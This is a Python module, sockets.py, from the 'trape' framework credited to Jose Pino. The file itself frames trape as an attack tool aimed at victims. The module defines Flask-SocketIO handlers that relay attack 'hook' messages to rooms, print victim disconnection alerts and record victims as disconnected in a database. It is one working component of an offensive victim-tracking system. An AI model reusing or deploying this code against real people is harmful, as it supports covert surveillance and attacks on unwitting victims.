#!/usr/bin/env python
# -*- coding: utf-8 -*-
# **
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
# **
from flask import session
from flask_socketio import emit, join_room, Namespace
from core.user_objects import attacks_hook_message
from core.utils import utils
from core import db


class Sockets(Namespace):

    def on_join(self, message):
        try:
            join_room(message['room'])
            session['receive_count'] = session.get('receive_count', 0) + 1
        except Exception as error:
            print(error)

    def on_my_room_event(self, message):
        try:
            session['receive_count'] = session.get('receive_count', 0) + 1
            hookAction = attacks_hook_message(message['data']['type'])
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "@" + utils.Color[
                'white'] + "]" + " " + hookAction + utils.Color['blue'] + message['data']['message'] + utils.Color[
                         'white'] + ' in ' + utils.Color['green'] + message['room'] + utils.Color['white'])
            emit('my_response', {'data': message['data'], 'count': session['receive_count']}, room=message['room'])
        except Exception as error:
            print(error)

    def on_disconnect_request(self, d):
        try:
            session['receive_count'] = session.get('receive_count', 0) + 1
            emit('my_response', {'data': 'Disconnected!', 'count': session['receive_count']})
            utils.Go(
                utils.Color['white'] + "[" + utils.Color['redBold'] + "-" + utils.Color['white'] + "]" + utils.Color[
                    'red'] + " " + "A victim has closed her connection with the following id:" + " " + utils.Color[
                    'green'] + d['vId'] + utils.Color['white'])
            db.sentences_victim('disconnect_victim', d['vId'], 2)
        except Exception as error:
            print(error)

    def on_error(self, d):
        print("Error from sockets.py:error: " + d)
        pass


